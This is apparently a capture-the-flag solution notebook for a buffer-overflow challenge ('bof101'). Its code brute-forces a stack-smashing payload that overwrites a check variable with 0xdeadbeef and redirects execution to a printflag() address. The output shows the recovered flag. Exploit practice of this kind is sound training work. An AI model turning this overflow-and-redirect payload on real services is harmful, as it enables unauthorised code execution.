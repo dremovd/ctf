{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "130fbfe9",
   "metadata": {},
   "outputs": [],
   "source": []
  },
  {
   "cell_type": "code",
   "execution_count": 8,
   "id": "7776c964",
   "metadata": {},
   "outputs": [],
   "source": [
    "import socket\n",
    "\n",
    "class ServerConnection:\n",
    "    def __init__(self):\n",
    "        self.HOST = \"bof101.sstf.site\"\n",
    "        self.PORT = 1337\n",
    "        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n",
    "        self.socket.connect((self.HOST, self.PORT))\n",
    "\n",
    "    def send(self, payload):\n",
    "        # Recieve printflag()'s addr: 0x4011f6\\n\n",
    "        assert self.socket.recv(1024).decode() == \"printflag()'s addr: 0x4011f6\\n\"\n",
    "        # Recieve What is your name?\\n:\n",
    "        prompt = self.socket.recv(1024)\n",
    "        assert prompt.decode() == \"What is your name?\\n: \"\n",
    "        self.socket.sendall(payload + b'\\n')\n",
    "\n",
    "        # Receive the response\n",
    "        response = self.socket.recv(1024)\n",
    "        return response\n",
    "    \n",
    "    def close(self):\n",
    "        self.socket.close()\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 9,
   "id": "4207054f",
   "metadata": {
    "scrolled": false
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "b'____________________________________________________________________________________________________________________________________________\\xef\\xbe\\xad\\xde\\xf6\\x11@\\x00\\x00\\x00\\x00\\x00'\n",
      "offset:0, order:(little), response: \"b''\"\n",
      "b'____________________________________________________________________________________________________________________________________________\\xef\\xbe\\xad\\xde\\x00@\\x11\\xf6\\x00\\x00\\x00\\x00'\n",
      "offset:0, order:(big), response: \"b''\"\n",
      "b'____________________________________________________________________________________________________________________________________________\\xef\\xbe\\xad\\xde____\\xf6\\x11@\\x00\\x00\\x00\\x00\\x00'\n",
      "offset:4, order:(little), response: \"b''\"\n",
      "b'____________________________________________________________________________________________________________________________________________\\xef\\xbe\\xad\\xde____\\x00@\\x11\\xf6\\x00\\x00\\x00\\x00'\n",
      "offset:4, order:(big), response: \"b''\"\n",
      "b'____________________________________________________________________________________________________________________________________________\\xef\\xbe\\xad\\xde________\\xf6\\x11@\\x00\\x00\\x00\\x00\\x00'\n",
      "offset:8, order:(little), response: \"b'SCTF{N0VV_U_AR3_B0F_3xpEr7}\\n________\\xef\\xbe\\xad\\xde____\\x03'\"\n",
      "b'____________________________________________________________________________________________________________________________________________\\xef\\xbe\\xad\\xde________\\x00@\\x11\\xf6\\x00\\x00\\x00\\x00'\n",
      "offset:8, order:(big), response: \"b''\"\n",
      "b'____________________________________________________________________________________________________________________________________________\\xef\\xbe\\xad\\xde____________\\xf6\\x11@\\x00\\x00\\x00\\x00\\x00'\n",
      "offset:12, order:(little), response: \"b''\"\n",
      "b'____________________________________________________________________________________________________________________________________________\\xef\\xbe\\xad\\xde____________\\x00@\\x11\\xf6\\x00\\x00\\x00\\x00'\n",
      "offset:12, order:(big), response: \"b''\"\n",
      "b'____________________________________________________________________________________________________________________________________________\\xef\\xbe\\xad\\xde________________\\xf6\\x11@\\x00\\x00\\x00\\x00\\x00'\n",
      "offset:16, order:(little), response: \"b''\"\n",
      "b'____________________________________________________________________________________________________________________________________________\\xef\\xbe\\xad\\xde________________\\x00@\\x11\\xf6\\x00\\x00\\x00\\x00'\n",
      "offset:16, order:(big), response: \"b''\"\n",
      "b'____________________________________________________________________________________________________________________________________________\\xef\\xbe\\xad\\xde____________________\\xf6\\x11@\\x00\\x00\\x00\\x00\\x00'\n",
      "offset:20, order:(little), response: \"b''\"\n",
      "b'____________________________________________________________________________________________________________________________________________\\xef\\xbe\\xad\\xde____________________\\x00@\\x11\\xf6\\x00\\x00\\x00\\x00'\n",
      "offset:20, order:(big), response: \"b''\"\n",
      "b'____________________________________________________________________________________________________________________________________________\\xef\\xbe\\xad\\xde________________________\\xf6\\x11@\\x00\\x00\\x00\\x00\\x00'\n",
      "offset:24, order:(little), response: \"b''\"\n",
      "b'____________________________________________________________________________________________________________________________________________\\xef\\xbe\\xad\\xde________________________\\x00@\\x11\\xf6\\x00\\x00\\x00\\x00'\n",
      "offset:24, order:(big), response: \"b''\"\n",
      "b'____________________________________________________________________________________________________________________________________________\\xef\\xbe\\xad\\xde____________________________\\xf6\\x11@\\x00\\x00\\x00\\x00\\x00'\n",
      "offset:28, order:(little), response: \"b''\"\n",
      "b'____________________________________________________________________________________________________________________________________________\\xef\\xbe\\xad\\xde____________________________\\x00@\\x11\\xf6\\x00\\x00\\x00\\x00'\n",
      "offset:28, order:(big), response: \"b''\"\n",
      "b'____________________________________________________________________________________________________________________________________________\\xef\\xbe\\xad\\xde________________________________\\xf6\\x11@\\x00\\x00\\x00\\x00\\x00'\n",
      "offset:32, order:(little), response: \"b''\"\n",
      "b'____________________________________________________________________________________________________________________________________________\\xef\\xbe\\xad\\xde________________________________\\x00@\\x11\\xf6\\x00\\x00\\x00\\x00'\n",
      "offset:32, order:(big), response: \"b''\"\n",
      "b'____________________________________________________________________________________________________________________________________________\\xef\\xbe\\xad\\xde____________________________________\\xf6\\x11@\\x00\\x00\\x00\\x00\\x00'\n"
     ]
    },
    {
     "ename": "KeyboardInterrupt",
     "evalue": "",
     "output_type": "error",
     "traceback": [
      "\u001b[0;31m---------------------------------------------------------------------------\u001b[0m",
      "\u001b[0;31mKeyboardInterrupt\u001b[0m                         Traceback (most recent call last)",
      "Cell \u001b[0;32mIn[9], line 15\u001b[0m\n\u001b[1;32m     13\u001b[0m \u001b[38;5;28mprint\u001b[39m(payload)\n\u001b[1;32m     14\u001b[0m \u001b[38;5;66;03m# Now you can send this payload as input to the program\u001b[39;00m\n\u001b[0;32m---> 15\u001b[0m \u001b[38;5;28mprint\u001b[39m(\u001b[38;5;124mf\u001b[39m\u001b[38;5;124m'\u001b[39m\u001b[38;5;124moffset:\u001b[39m\u001b[38;5;132;01m{\u001b[39;00moffset2\u001b[38;5;132;01m}\u001b[39;00m\u001b[38;5;124m, order:(\u001b[39m\u001b[38;5;132;01m{\u001b[39;00morder\u001b[38;5;132;01m}\u001b[39;00m\u001b[38;5;124m), response: \u001b[39m\u001b[38;5;124m\"\u001b[39m\u001b[38;5;132;01m{\u001b[39;00m\u001b[43mconnection\u001b[49m\u001b[38;5;241;43m.\u001b[39;49m\u001b[43msend\u001b[49m\u001b[43m(\u001b[49m\u001b[43mpayload\u001b[49m\u001b[43m)\u001b[49m\u001b[38;5;132;01m}\u001b[39;00m\u001b[38;5;124m\"\u001b[39m\u001b[38;5;124m'\u001b[39m)\n",
      "Cell \u001b[0;32mIn[8], line 19\u001b[0m, in \u001b[0;36mServerConnection.send\u001b[0;34m(self, payload)\u001b[0m\n\u001b[1;32m     16\u001b[0m \u001b[38;5;28mself\u001b[39m\u001b[38;5;241m.\u001b[39msocket\u001b[38;5;241m.\u001b[39msendall(payload \u001b[38;5;241m+\u001b[39m \u001b[38;5;124mb\u001b[39m\u001b[38;5;124m'\u001b[39m\u001b[38;5;130;01m\\n\u001b[39;00m\u001b[38;5;124m'\u001b[39m)\n\u001b[1;32m     18\u001b[0m \u001b[38;5;66;03m# Receive the response\u001b[39;00m\n\u001b[0;32m---> 19\u001b[0m response \u001b[38;5;241m=\u001b[39m \u001b[38;5;28;43mself\u001b[39;49m\u001b[38;5;241;43m.\u001b[39;49m\u001b[43msocket\u001b[49m\u001b[38;5;241;43m.\u001b[39;49m\u001b[43mrecv\u001b[49m\u001b[43m(\u001b[49m\u001b[38;5;241;43m1024\u001b[39;49m\u001b[43m)\u001b[49m\n\u001b[1;32m     20\u001b[0m \u001b[38;5;28;01mreturn\u001b[39;00m response\n",
      "\u001b[0;31mKeyboardInterrupt\u001b[0m: "
     ]
    }
   ],
   "source": [
    "from Crypto.Util.number import long_to_bytes\n",
    "address_of_printflag = 0x004011f6\n",
    "\n",
    "filler = b'_'\n",
    "for offset2 in range(0, 256, 4):\n",
    "    for order in ('little', 'big'):\n",
    "        connection = ServerConnection()\n",
    "        payload = filler * 140  # Fill the name buffer\n",
    "        payload += long_to_bytes(0xdeadbeef, 4)[::-1]  # Overwrite the check variable\n",
    "        payload += filler * offset2 + address_of_printflag.to_bytes(4, order)  # Add the address of printflag\n",
    "        payload += long_to_bytes(0x00000000, 4)[::-1]  # Overwrite the check variable\n",
    "\n",
    "        print(payload)\n",
    "        # Now you can send this payload as input to the program\n",
    "        print(f'offset:{offset2}, order:({order}), response: \"{connection.send(payload)}\"')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "1b186cbd",
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "py310",
   "language": "python",
   "name": "py310"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.10.11"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
